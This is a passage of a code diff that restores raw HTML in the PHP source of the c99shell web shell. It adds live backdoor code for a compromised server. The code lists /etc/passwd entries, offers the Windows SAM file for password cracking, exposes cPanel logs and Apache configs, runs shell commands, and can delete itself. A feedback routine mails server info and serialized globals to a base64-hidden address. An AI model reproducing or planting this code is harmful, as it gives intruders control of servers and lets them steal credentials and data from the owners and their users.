-echo "&lt;center&gt;&lt;b&gt;Server security information:&lt;/b&gt;&lt;/center&gt;&lt;b&gt;Open base dir: ".$hopenbasedir."&lt;/b&gt;&lt;br&gt;";
+echo "<center><b>Server security information:</b></center><b>Open base dir: ".$hopenbasedir."</b><br>";
 if (!$win)
 {
   if ($nixpasswd)
   {
    if ($nixpasswd == 1) {$nixpasswd = 0;}
-   echo "&lt;b&gt;*nix /etc/passwd:&lt;/b&gt;&lt;br&gt;";
+   echo "<b>*nix /etc/passwd:</b><br>";
    if (!is_numeric($nixpwd_s)) {$nixpwd_s = 0;}
    if (!is_numeric($nixpwd_e)) {$nixpwd_e = $nixpwdperpage;}
-   echo "&lt;form action=\"".$surl."\"&gt;&lt;input type=hidden name=act value=\"security\"&gt;&lt;input type=hidden name=\"nixpasswd\" value=\"1\"&gt;&lt;b&gt;From:&lt;/b&gt;&nbsp;&lt;input type=\"text=\" name=\"nixpwd_s\" value=\"".$nixpwd_s."\"&gt;&nbsp;&lt;b&gt;To:&lt;/b&gt;&nbsp;&lt;input type=\"text\" name=\"nixpwd_e\" value=\"".$nixpwd_e."\"&gt;&nbsp;&lt;input type=submit value=\"View\"&gt;&lt;/form&gt;&lt;br&gt;";
+   echo "<form action=\"".$surl."\"><input type=hidden name=act value=\"security\"><input type=hidden name=\"nixpasswd\" value=\"1\"><b>From:</b>&nbsp;<input type=\"text=\" name=\"nixpwd_s\" value=\"".$nixpwd_s."\">&nbsp;<b>To:</b>&nbsp;<input type=\"text\" name=\"nixpwd_e\" value=\"".$nixpwd_e."\">&nbsp;<input type=submit value=\"View\"></form><br>";
    $i = $nixpwd_s;
-   while ($i &lt; $nixpwd_e)
+   while ($i < $nixpwd_e)
    {
     $uid = posix_getpwuid($i);
     if ($uid)
     {
-     $uid["dir"] = "&lt;a href=\"".$surl."act=ls&d=".urlencode($uid["dir"])."\"&gt;".$uid["dir"]."&lt;/a&gt;";
-     echo join(":",$uid)."&lt;br&gt;";
+     $uid["dir"] = "<a href=\"".$surl."act=ls&d=".urlencode($uid["dir"])."\">".$uid["dir"]."</a>";
+     echo join(":",$uid)."<br>";
     }
     $i++;
    }
   }
-  else {echo "&lt;br&gt;&lt;a href=\"".$surl."act=security&nixpasswd=1&d=".$ud."\"&gt;&lt;b&gt;&lt;u&gt;Get /etc/passwd&lt;/u&gt;&lt;/b&gt;&lt;/a&gt;&lt;br&gt;";}
+  else {echo "<br><a href=\"".$surl."act=security&nixpasswd=1&d=".$ud."\"><b><u>Get /etc/passwd</u></b></a><br>";}
 }
 else
 {
   $v = $_SERVER["WINDIR"]."\repair\sam";
-  if (file_get_contents($v)) {echo "&lt;b&gt;&lt;font color=red&gt;You can't crack winnt passwords(".$v.") &lt;/font&gt;&lt;/b&gt;&lt;br&gt;";}
-  else {echo "&lt;b&gt;&lt;font color=green&gt;You can crack winnt passwords. &lt;a href=\"".$surl."act=f&f=sam&d=".$_SERVER["WINDIR"]."\\repair&ft=download\"&gt;&lt;u&gt;&lt;b&gt;Download&lt;/b&gt;&lt;/u&gt;&lt;/a&gt;, and use lcp.crack+ ?.&lt;/font&gt;&lt;/b&gt;&lt;br&gt;";}
+  if (file_get_contents($v)) {echo "<b><font color=red>You can't crack winnt passwords(".$v.") </font></b><br>";}
+  else {echo "<b><font color=green>You can crack winnt passwords. <a href=\"".$surl."act=f&f=sam&d=".$_SERVER["WINDIR"]."\\repair&ft=download\"><u><b>Download</b></u></a>, and use lcp.crack+ ?.</font></b><br>";}
 }
-if (file_get_contents("/etc/userdomains")) {echo "&lt;b&gt;&lt;font color=green&gt;&lt;a href=\"".$surl."act=f&f=userdomains&d=".urlencode("/etc")."&ft=txt\"&gt;&lt;u&gt;&lt;b&gt;View cpanel user-domains logs&lt;/b&gt;&lt;/u&gt;&lt;/a&gt;&lt;/font&gt;&lt;/b&gt;&lt;br&gt;";}
-if (file_get_contents("/var/cpanel/accounting.log")) {echo "&lt;b&gt;&lt;font color=green&gt;&lt;a href=\"".$surl."act=f&f=accounting.log&d=".urlencode("/var/cpanel/")."\"&ft=txt&gt;&lt;u&gt;&lt;b&gt;View cpanel logs&lt;/b&gt;&lt;/u&gt;&lt;/a&gt;&lt;/font&gt;&lt;/b&gt;&lt;br&gt;";}
-if (file_get_contents("/usr/local/apache/conf/httpd.conf")) {echo "&lt;b&gt;&lt;font color=green&gt;&lt;a href=\"".$surl."act=f&f=httpd.conf&d=".urlencode("/usr/local/apache/conf")."&ft=txt\"&gt;&lt;u&gt;&lt;b&gt;Apache configuration (httpd.conf)&lt;/b&gt;&lt;/u&gt;&lt;/a&gt;&lt;/font&gt;&lt;/b&gt;&lt;br&gt;";}
-if (file_get_contents("/etc/httpd.conf")) {echo "&lt;b&gt;&lt;font color=green&gt;&lt;a href=\"".$surl."act=f&f=httpd.conf&d=".urlencode("/etc")."&ft=txt\"&gt;&lt;u&gt;&lt;b&gt;Apache configuration (httpd.conf)&lt;/b&gt;&lt;/u&gt;&lt;/a&gt;&lt;/font&gt;&lt;/b&gt;&lt;br&gt;";}
-if (file_get_contents("/etc/syslog.conf")) {echo "&lt;b&gt;&lt;font color=green&gt;&lt;a href=\"".$surl."act=f&f=syslog.conf&d=".urlencode("/etc")."&ft=txt\"&gt;&lt;u&gt;&lt;b&gt;Syslog configuration (syslog.conf)&lt;/b&gt;&lt;/u&gt;&lt;/a&gt;&lt;/font&gt;&lt;/b&gt;&lt;br&gt;";}
-if (file_get_contents("/etc/motd")) {echo "&lt;b&gt;&lt;font color=green&gt;&lt;a href=\"".$surl."act=f&f=motd&d=".urlencode("/etc")."&ft=txt\"&gt;&lt;u&gt;&lt;b&gt;Message Of The Day&lt;/b&gt;&lt;/u&gt;&lt;/a&gt;&lt;/font&gt;&lt;/b&gt;&lt;br&gt;";}
-if (file_get_contents("/etc/hosts")) {echo "&lt;b&gt;&lt;font color=green&gt;&lt;a href=\"".$surl."act=f&f=hosts&d=".urlencode("/etc")."&ft=txt\"&gt;&lt;u&gt;&lt;b&gt;Hosts&lt;/b&gt;&lt;/u&gt;&lt;/a&gt;&lt;/font&gt;&lt;/b&gt;&lt;br&gt;";}
-function displaysecinfo($name,$value) {if (!empty($value)) {if (!empty($name)) {$name = "&lt;b&gt;".$name." - &lt;/b&gt;";} echo $name.nl2br($value)."&lt;br&gt;";}}
+if (file_get_contents("/etc/userdomains")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=userdomains&d=".urlencode("/etc")."&ft=txt\"><u><b>View cpanel user-domains logs</b></u></a></font></b><br>";}
+if (file_get_contents("/var/cpanel/accounting.log")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=accounting.log&d=".urlencode("/var/cpanel/")."\"&ft=txt><u><b>View cpanel logs</b></u></a></font></b><br>";}
+if (file_get_contents("/usr/local/apache/conf/httpd.conf")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=httpd.conf&d=".urlencode("/usr/local/apache/conf")."&ft=txt\"><u><b>Apache configuration (httpd.conf)</b></u></a></font></b><br>";}
+if (file_get_contents("/etc/httpd.conf")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=httpd.conf&d=".urlencode("/etc")."&ft=txt\"><u><b>Apache configuration (httpd.conf)</b></u></a></font></b><br>";}
+if (file_get_contents("/etc/syslog.conf")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=syslog.conf&d=".urlencode("/etc")."&ft=txt\"><u><b>Syslog configuration (syslog.conf)</b></u></a></font></b><br>";}
+if (file_get_contents("/etc/motd")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=motd&d=".urlencode("/etc")."&ft=txt\"><u><b>Message Of The Day</b></u></a></font></b><br>";}
+if (file_get_contents("/etc/hosts")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=hosts&d=".urlencode("/etc")."&ft=txt\"><u><b>Hosts</b></u></a></font></b><br>";}
+function displaysecinfo($name,$value) {if (!empty($value)) {if (!empty($name)) {$name = "<b>".$name." - </b>";} echo $name.nl2br($value)."<br>";}}
 displaysecinfo("OS Version?",myshellexec("cat /proc/version"));
 displaysecinfo("Kernel version?",myshellexec("sysctl -a | grep version"));
 displaysecinfo("Distrib name",myshellexec("cat /etc/issue.net"));
@@ -1879,24 +1879,24 @@ if ($act == "mkfile")
 {
 if ($mkfile != $d)
 {
-  if (file_exists($mkfile)) {echo "&lt;b&gt;Make File \"".htmlspecialchars($mkfile)."\"&lt;/b&gt;: object alredy exists";}
-  elseif (!fopen($mkfile,"w")) {echo "&lt;b&gt;Make File \"".htmlspecialchars($mkfile)."\"&lt;/b&gt;: access denied";}
+  if (file_exists($mkfile)) {echo "<b>Make File \"".htmlspecialchars($mkfile)."\"</b>: object alredy exists";}
+  elseif (!fopen($mkfile,"w")) {echo "<b>Make File \"".htmlspecialchars($mkfile)."\"</b>: access denied";}
   else {$act = "f"; $d = dirname($mkfile); if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;} $f = basename($mkfile);}
 }
 else {$act = $dspact = "ls";}
 }
 if ($act == "encoder")
 {
-echo "&lt;script&gt;function set_encoder_input(text) {document.forms.encoder.input.value = text;}&lt;/script&gt;&lt;center&gt;&lt;b&gt;Encoder:&lt;/b&gt;&lt;/center&gt;&lt;form name=\"encoder\" action=\"".$surl."\" method=POST&gt;&lt;input type=hidden name=act value=encoder&gt;&lt;b&gt;Input:&lt;/b&gt;&lt;center&gt;&lt;textarea name=\"encoder_input\" id=\"input\" cols=50 rows=5&gt;".@htmlspecialchars($encoder_input)."&lt;/textarea&gt;&lt;br&gt;&lt;br&gt;&lt;input type=submit value=\"calculate\"&gt;&lt;br&gt;&lt;br&gt;&lt;/center&gt;&lt;b&gt;Hashes&lt;/b&gt;:&lt;br&gt;&lt;center&gt;";
+echo "<script>function set_encoder_input(text) {document.forms.encoder.input.value = text;}</script><center><b>Encoder:</b></center><form name=\"encoder\" action=\"".$surl."\" method=POST><input type=hidden name=act value=encoder><b>Input:</b><center><textarea name=\"encoder_input\" id=\"input\" cols=50 rows=5>".@htmlspecialchars($encoder_input)."</textarea><br><br><input type=submit value=\"calculate\"><br><br></center><b>Hashes</b>:<br><center>";
 foreach(array("md5","crypt","sha1","crc32") as $v)
 {
-  echo $v." - &lt;input type=text size=50 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".$v($encoder_input)."\" readonly&gt;&lt;br&gt;";
+  echo $v." - <input type=text size=50 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".$v($encoder_input)."\" readonly><br>";
 }
-echo "&lt;/center&gt;&lt;b&gt;Url:&lt;/b&gt;&lt;center&gt;&lt;br&gt;urlencode - &lt;input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".urlencode($encoder_input)."\" readonly&gt;
-&lt;br&gt;urldecode - &lt;input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".htmlspecialchars(urldecode($encoder_input))."\" readonly&gt;
-&lt;br&gt;&lt;/center&gt;&lt;b&gt;Base64:&lt;/b&gt;&lt;center&gt;base64_encode - &lt;input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".base64_encode($encoder_input)."\" readonly&gt;&lt;/center&gt;";
-echo "&lt;center&gt;base64_decode - ";
-if (base64_encode(base64_decode($encoder_input)) != $encoder_input) {echo "&lt;input type=text size=35 value=\"failed\" disabled readonly&gt;";}
+echo "</center><b>Url:</b><center><br>urlencode - <input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".urlencode($encoder_input)."\" readonly>
+<br>urldecode - <input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".htmlspecialchars(urldecode($encoder_input))."\" readonly>
+<br></center><b>Base64:</b><center>base64_encode - <input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".base64_encode($encoder_input)."\" readonly></center>";
+echo "<center>base64_decode - ";
+if (base64_encode(base64_decode($encoder_input)) != $encoder_input) {echo "<input type=text size=35 value=\"failed\" disabled readonly>";}
 else
 {
   $debase64 = base64_decode($encoder_input);
@@ -1904,43 +1904,43 @@ else
   $a = explode("\r\n",$debase64);
   $rows = count($a);
   $debase64 = htmlspecialchars($debase64);
-  if ($rows == 1) {echo "&lt;input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".$debase64."\" id=\"debase64\" readonly&gt;";}
-  else {$rows++; echo "&lt;textarea cols=\"40\" rows=\"".$rows."\" onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" id=\"debase64\" readonly&gt;".$debase64."&lt;/textarea&gt;";}
-  echo "&nbsp;&lt;a href=\"#\" onclick=\"set_encoder_input(document.forms.encoder.debase64.value)\"&gt;&lt;b&gt;^&lt;/b&gt;&lt;/a&gt;";
+  if ($rows == 1) {echo "<input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".$debase64."\" id=\"debase64\" readonly>";}
+  else {$rows++; echo "<textarea cols=\"40\" rows=\"".$rows."\" onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" id=\"debase64\" readonly>".$debase64."</textarea>";}
+  echo "&nbsp;<a href=\"#\" onclick=\"set_encoder_input(document.forms.encoder.debase64.value)\"><b>^</b></a>";
 }
-echo "&lt;/center&gt;&lt;br&gt;&lt;b&gt;Base convertations&lt;/b&gt;:&lt;center&gt;dec2hex - &lt;input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"";
+echo "</center><br><b>Base convertations</b>:<center>dec2hex - <input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"";
 $c = strlen($encoder_input);
-for($i=0;$i&lt;$c;$i++)
+for($i=0;$i<$c;$i++)
 {
   $hex = dechex(ord($encoder_input[$i]));
   if ($encoder_input[$i] == "&") {echo $encoder_input[$i];}
   elseif ($encoder_input[$i] != "\\") {echo "%".$hex;}
 }
-echo "\" readonly&gt;&lt;br&gt;&lt;/center&gt;&lt;/form&gt;";
+echo "\" readonly><br></center></form>";
 }
 if ($act == "fsbuff")
 {
 $arr_copy = $sess_data["copy"];
 $arr_cut = $sess_data["cut"];
 $arr = array_merge($arr_copy,$arr_cut);
-if (count($arr) == 0) {echo "&lt;center&gt;&lt;b&gt;Buffer is empty!&lt;/b&gt;&lt;/center&gt;";}
-else {echo "&lt;b&gt;File-System buffer&lt;/b&gt;&lt;br&gt;&lt;br&gt;"; $ls_arr = $arr; $disp_fullpath = TRUE; $act = "ls";}
+if (count($arr) == 0) {echo "<center><b>Buffer is empty!</b></center>";}
+else {echo "<b>File-System buffer</b><br><br>"; $ls_arr = $arr; $disp_fullpath = TRUE; $act = "ls";}
 }
 if ($act == "selfremove")
 {
 if (($submit == $rndcode) and ($submit != ""))
 {
   if (unlink(__FILE__)) {@ob_clean(); echo "Thanks for using c99shell v.".$shver."!"; c99shexit(); }
-  else {echo "&lt;center&gt;&lt;b&gt;Can't delete ".__FILE__."!&lt;/b&gt;&lt;/center&gt;";}
+  else {echo "<center><b>Can't delete ".__FILE__."!</b></center>";}
 }
 else
 {
-  if (!empty($rndcode)) {echo "&lt;b&gt;Error: incorrect confimation!&lt;/b&gt;";}
+  if (!empty($rndcode)) {echo "<b>Error: incorrect confimation!</b>";}
   $rnd = rand(0,9).rand(0,9).rand(0,9);
-  echo "&lt;form action=\"".$surl."\"&gt;&lt;input type=hidden name=act value=selfremove&gt;&lt;b&gt;Self-remove: ".__FILE__." &lt;br&gt;&lt;b&gt;Are you sure?&lt;br&gt;For confirmation, enter \"".$rnd."\"&lt;/b&gt;:&nbsp;&lt;input type=hidden name=rndcode value=\"".$rnd."\"&gt;&lt;input type=text name=submit&gt;&nbsp;&lt;input type=submit value=\"YES\"&gt;&lt;/form&gt;";
+  echo "<form action=\"".$surl."\"><input type=hidden name=act value=selfremove><b>Self-remove: ".__FILE__." <br><b>Are you sure?<br>For confirmation, enter \"".$rnd."\"</b>:&nbsp;<input type=hidden name=rndcode value=\"".$rnd."\"><input type=text name=submit>&nbsp;<input type=submit value=\"YES\"></form>";
 }
 }
-if ($act == "update") {$ret = c99sh_getupdate(!!$confirmupdate); echo "&lt;b&gt;".$ret."&lt;/b&gt;"; if (stristr($ret,"new version")) {echo "&lt;br&gt;&lt;br&gt;&lt;input type=button onclick=\"location.href='".$surl."act=update&confirmupdate=1';\" value=\"Update now\"&gt;";}}
+if ($act == "update") {$ret = c99sh_getupdate(!!$confirmupdate); echo "<b>".$ret."</b>"; if (stristr($ret,"new version")) {echo "<br><br><input type=button onclick=\"location.href='".$surl."act=update&confirmupdate=1';\" value=\"Update now\">";}}
 if ($act == "feedback")
 {
 $suppmail = base64_decode("Yzk5c2hlbGxAY2N0ZWFtLnJ1");
@@ -1959,13 +1959,13 @@ if (!empty($submit))
    $body .= "\n"."phpinfo(): ".$phpinfo."\n"."\$GLOBALS=".base64_encode(serialize($GLOBALS))."\n";
   }
   mail($suppmail,"c99shell v.".$shver." feedback #".$ticket,$body,"FROM: ".$suppmail);
-  echo "&lt;center&gt;&lt;b&gt;Thanks for your feedback! Your ticket ID: ".$ticket.".&lt;/b&gt;&lt;/center&gt;";
+  echo "<center><b>Thanks for your feedback! Your ticket ID: ".$ticket.".</b></center>";
 }
-else {echo "&lt;form action=\"".$surl."\" method=POST&gt;&lt;input type=hidden name=act value=feedback&gt;&lt;b&gt;Feedback or report bug (".str_replace(array("@","."),array("[at]","[dot]"),$suppmail)."):&lt;br&gt;&lt;br&gt;Your name: &lt;input type=\"text\" name=\"fdbk_name\" value=\"".htmlspecialchars($fdbk_name)."\"&gt;&lt;br&gt;&lt;br&gt;Your e-mail: &lt;input type=\"text\" name=\"fdbk_email\" value=\"".htmlspecialchars($fdbk_email)."\"&gt;&lt;br&gt;&lt;br&gt;Message:&lt;br&gt;&lt;textarea name=\"fdbk_body\" cols=80 rows=10&gt;".htmlspecialchars($fdbk_body)."&lt;/textarea&gt;&lt;input type=\"hidden\" name=\"fdbk_ref\" value=\"".urlencode($HTTP_REFERER)."\"&gt;&lt;br&gt;&lt;br&gt;Attach server-info * &lt;input type=\"checkbox\" name=\"fdbk_servinf\" value=\"1\" checked&gt;&lt;br&gt;&lt;br&gt;There are no checking in the form.&lt;br&gt;&lt;br&gt;* - strongly recommended, if you report bug, because we need it for bug-fix.&lt;br&gt;&lt;br&gt;We understand languages: English, Russian.&lt;br&gt;&lt;br&gt;&lt;input type=\"submit\" name=\"submit\" value=\"Send\"&gt;&lt;/form&gt;";}
+else {echo "<form action=\"".$surl."\" method=POST><input type=hidden name=act value=feedback><b>Feedback or report bug (".str_replace(array("@","."),array("[at]","[dot]"),$suppmail)."):<br><br>Your name: <input type=\"text\" name=\"fdbk_name\" value=\"".htmlspecialchars($fdbk_name)."\"><br><br>Your e-mail: <input type=\"text\" name=\"fdbk_email\" value=\"".htmlspecialchars($fdbk_email)."\"><br><br>Message:<br><textarea name=\"fdbk_body\" cols=80 rows=10>".htmlspecialchars($fdbk_body)."</textarea><input type=\"hidden\" name=\"fdbk_ref\" value=\"".urlencode($HTTP_REFERER)."\"><br><br>Attach server-info * <input type=\"checkbox\" name=\"fdbk_servinf\" value=\"1\" checked><br><br>There are no checking in the form.<br><br>* - strongly recommended, if you report bug, because we need it for bug-fix.<br><br>We understand languages: English, Russian.<br><br><input type=\"submit\" name=\"submit\" value=\"Send\"></form>";}
 }
 if ($act == "search")
 {
-echo "&lt;b&gt;Search in file-system:&lt;/b&gt;&lt;br&gt;";
+echo "<b>Search in file-system:</b><br>";
 if (empty($search_in)) {$search_in = $d;}
 if (empty($search_name)) {$search_name = "(.*)"; $search_name_regexp = 1;}
 if (empty($search_text_wwo)) {$search_text_regexp = 0;}
@@ -1978,17 +1978,17 @@ if (!empty($submit))
   $search_i_d = 0;
   $a = array
   (
-   "name"=&gt;$search_name, "name_regexp"=&gt;$search_name_regexp,
-   "text"=&gt;$search_text, "text_regexp"=&gt;$search_text_regxp,
-   "text_wwo"=&gt;$search_text_wwo,
-   "text_cs"=&gt;$search_text_cs,
-   "text_not"=&gt;$search_text_not
+   "name"=>$search_name, "name_regexp"=>$search_name_regexp,
+   "text"=>$search_text, "text_regexp"=>$search_text_regxp,
+   "text_wwo"=>$search_text_wwo,
+   "text_cs"=>$search_text_cs,
+   "text_not"=>$search_text_not
   );
   $searchtime = getmicrotime();
   $in = array_unique(explode(";",$search_in));
   foreach($in as $v) {c99fsearch($v);}
   $searchtime = round(getmicrotime()-$searchtime,4);
-  if (count($found) == 0) {echo "&lt;b&gt;No files found!&lt;/b&gt;";}
+  if (count($found) == 0) {echo "<b>No files found!</b>";}
   else
   {
    $ls_arr = $found;
@@ -1996,22 +1996,22 @@ if (!empty($submit))
    $act = "ls";
   }
 }
-echo "&lt;form method=POST&gt;
-&lt;input type=hidden name=\"d\" value=\"".$dispd."\"&gt;&lt;input type=hidden name=act value=\"".$dspact."\"&gt;
-&lt;b&gt;Search for (file/folder name): &lt;/b&gt;&lt;input type=\"text\" name=\"search_name\" size=\"".round(strlen($search_name)+25)."\" value=\"".htmlspecialchars($search_name)."\"&gt;&nbsp;&lt;input type=\"checkbox\" name=\"search_name_regexp\" value=\"1\" ".($search_name_regexp == 1?" checked":"")."&gt; - regexp
-&lt;br&gt;&lt;b&gt;Search in (explode \";\"): &lt;/b&gt;&lt;input type=\"text\" name=\"search_in\" size=\"".round(strlen($search_in)+25)."\" value=\"".htmlspecialchars($search_in)."\"&gt;
-&lt;br&gt;&lt;br&gt;&lt;b&gt;Text:&lt;/b&gt;&lt;br&gt;&lt;textarea name=\"search_text\" cols=\"122\" rows=\"10\"&gt;".htmlspecialchars($search_text)."&lt;/textarea&gt;
-&lt;br&gt;&lt;br&gt;&lt;input type=\"checkbox\" name=\"search_text_regexp\" value=\"1\" ".($search_text_regexp == 1?" checked":"")."&gt; - regexp
-&nbsp;&nbsp;&lt;input type=\"checkbox\" name=\"search_text_wwo\" value=\"1\" ".($search_text_wwo == 1?" checked":"")."&gt; - &lt;u&gt;w&lt;/u&gt;hole words only
-&nbsp;&nbsp;&lt;input type=\"checkbox\" name=\"search_text_cs\" value=\"1\" ".($search_text_cs == 1?" checked":"")."&gt; - cas&lt;u&gt;e&lt;/u&gt; sensitive
-&nbsp;&nbsp;&lt;input type=\"checkbox\" name=\"search_text_not\" value=\"1\" ".($search_text_not == 1?" checked":"")."&gt; - find files &lt;u&gt;NOT&lt;/u&gt; containing the text
-&lt;br&gt;&lt;br&gt;&lt;input type=submit name=submit value=\"Search\"&gt;&lt;/form&gt;";
-if ($act == "ls") {$dspact = $act; echo "&lt;hr size=\"1\" noshade&gt;&lt;b&gt;Search took ".$searchtime." secs (".$search_i_f." files and ".$search_i_d." folders, ".round(($search_i_f+$search_i_d)/$searchtime,4)." objects per second).&lt;/b&gt;&lt;br&gt;&lt;br&gt;";}
+echo "<form method=POST>
+<input type=hidden name=\"d\" value=\"".$dispd."\"><input type=hidden name=act value=\"".$dspact."\">
+<b>Search for (file/folder name): </b><input type=\"text\" name=\"search_name\" size=\"".round(strlen($search_name)+25)."\" value=\"".htmlspecialchars($search_name)."\">&nbsp;<input type=\"checkbox\" name=\"search_name_regexp\" value=\"1\" ".($search_name_regexp == 1?" checked":"")."> - regexp
+<br><b>Search in (explode \";\"): </b><input type=\"text\" name=\"search_in\" size=\"".round(strlen($search_in)+25)."\" value=\"".htmlspecialchars($search_in)."\">
+<br><br><b>Text:</b><br><textarea name=\"search_text\" cols=\"122\" rows=\"10\">".htmlspecialchars($search_text)."</textarea>
+<br><br><input type=\"checkbox\" name=\"search_text_regexp\" value=\"1\" ".($search_text_regexp == 1?" checked":"")."> - regexp
+&nbsp;&nbsp;<input type=\"checkbox\" name=\"search_text_wwo\" value=\"1\" ".($search_text_wwo == 1?" checked":"")."> - <u>w</u>hole words only
+&nbsp;&nbsp;<input type=\"checkbox\" name=\"search_text_cs\" value=\"1\" ".($search_text_cs == 1?" checked":"")."> - cas<u>e</u> sensitive
+&nbsp;&nbsp;<input type=\"checkbox\" name=\"search_text_not\" value=\"1\" ".($search_text_not == 1?" checked":"")."> - find files <u>NOT</u> containing the text
+<br><br><input type=submit name=submit value=\"Search\"></form>";
+if ($act == "ls") {$dspact = $act; echo "<hr size=\"1\" noshade><b>Search took ".$searchtime." secs (".$search_i_f." files and ".$search_i_d." folders, ".round(($search_i_f+$search_i_d)/$searchtime,4)." objects per second).</b><br><br>";}
 }
 if ($act == "chmod")
 {
 $mode = fileperms($d.$f);
-if (!$mode) {echo "&lt;b&gt;Change file-mode with error:&lt;/b&gt; can't get current value.";}
+if (!$mode) {echo "<b>Change file-mode with error:</b> can't get current value.";}
 else
 {
   $form = TRUE;
@@ -2024,7 +2024,7 @@ else
   if ($form)
   {
    $perms = parse_perms($mode);
-   echo "&lt;b&gt;Changing file-mode (".$d.$f."), ".view_perms_color($d.$f)." (".substr(decoct(fileperms($d.$f)),-4,4).")&lt;/b&gt;&lt;br&gt;".($err?"&lt;b&gt;Error:&lt;/b&gt; ".$err:"")."&lt;form action=\"".$surl."\" method=POST&gt;&lt;input type=hidden name=d value=\"".htmlspecialchars($d)."\"&gt;&lt;input type=hidden name=f value=\"".htmlspecialchars($f)."\"&gt;&lt;input type=hidden name=act value=chmod&gt;&lt;table align=left width=300 border=0 cellspacing=0 cellpadding=5&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Owner&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;input type=checkbox NAME=chmod_o[r] value=1".($perms["o"]["r"]?" checked":"")."&gt;&nbsp;Read&lt;br&gt;&lt;input type=checkbox name=chmod_o[w] value=1".($perms["o"]["w"]?" checked":"")."&gt;&nbsp;Write&lt;br&gt;&lt;input type=checkbox NAME=chmod_o[x] value=1".($perms["o"]["x"]?" checked":"")."&gt;eXecute&lt;/td&gt;&lt;td&gt;&lt;b&gt;Group&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;input type=checkbox NAME=chmod_g[r] value=1".($perms["g"]["r"]?" checked":"")."&gt;&nbsp;Read&lt;br&gt;&lt;input type=checkbox NAME=chmod_g[w] value=1".($perms["g"]["w"]?" checked":"")."&gt;&nbsp;Write&lt;br&gt;&lt;input type=checkbox NAME=chmod_g[x] value=1".($perms["g"]["x"]?" checked":"")."&gt;eXecute&lt;/font&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;World&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;input type=checkbox NAME=chmod_w[r] value=1".($perms["w"]["r"]?" checked":"")."&gt;&nbsp;Read&lt;br&gt;&lt;input type=checkbox NAME=chmod_w[w] value=1".($perms["w"]["w"]?" checked":"")."&gt;&nbsp;Write&lt;br&gt;&lt;input type=checkbox NAME=chmod_w[x] value=1".($perms["w"]["x"]?" checked":"")."&gt;eXecute&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;input type=submit name=chmod_submit value=\"Save\"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/form&gt;";
+   echo "<b>Changing file-mode (".$d.$f."), ".view_perms_color($d.$f)." (".substr(decoct(fileperms($d.$f)),-4,4).")</b><br>".($err?"<b>Error:</b> ".$err:"")."<form action=\"".$surl."\" method=POST><input type=hidden name=d value=\"".htmlspecialchars($d)."\"><input type=hidden name=f value=\"".htmlspecialchars($f)."\"><input type=hidden name=act value=chmod><table align=left width=300 border=0 cellspacing=0 cellpadding=5><tr><td><b>Owner</b><br><br><input type=checkbox NAME=chmod_o[r] value=1".($perms["o"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox name=chmod_o[w] value=1".($perms["o"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_o[x] value=1".($perms["o"]["x"]?" checked":"").">eXecute</td><td><b>Group</b><br><br><input type=checkbox NAME=chmod_g[r] value=1".($perms["g"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox NAME=chmod_g[w] value=1".($perms["g"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_g[x] value=1".($perms["g"]["x"]?" checked":"").">eXecute</font></td><td><b>World</b><br><br><input type=checkbox NAME=chmod_w[r] value=1".($perms["w"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox NAME=chmod_w[w] value=1".($perms["w"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_w[x] value=1".($perms["w"]["x"]?" checked":"").">eXecute</font></td></tr><tr><td><input type=submit name=chmod_submit value=\"Save\"></td></tr></table></form>";
   }
 }
 }
@@ -2042,7 +2042,7 @@ if (!empty($submit))
   {
    if (empty($uploadfilename)) {$destin = $uploadfile["name"];}
    else {$destin = $userfilename;}
-   if (!move_uploaded_file($uploadfile["tmp_name"],$uploadpath.$destin)) {$uploadmess .= "Error uploading file ".$uploadfile["name"]." (can't copy \"".$uploadfile["tmp_name"]."\" to \"".$uploadpath.$destin."\"!&lt;br&gt;";}
+   if (!move_uploaded_file($uploadfile["tmp_name"],$uploadpath.$destin)) {$uploadmess .= "Error uploading file ".$uploadfile["name"]." (can't copy \"".$uploadfile["tmp_name"]."\" to \"".$uploadpath.$destin."\"!<br>";}
   }
   elseif (!empty($uploadurl))
   {
@@ -2055,20 +2055,20 @@ if (!empty($submit))
     {
      $i = 0;
      $b = "";
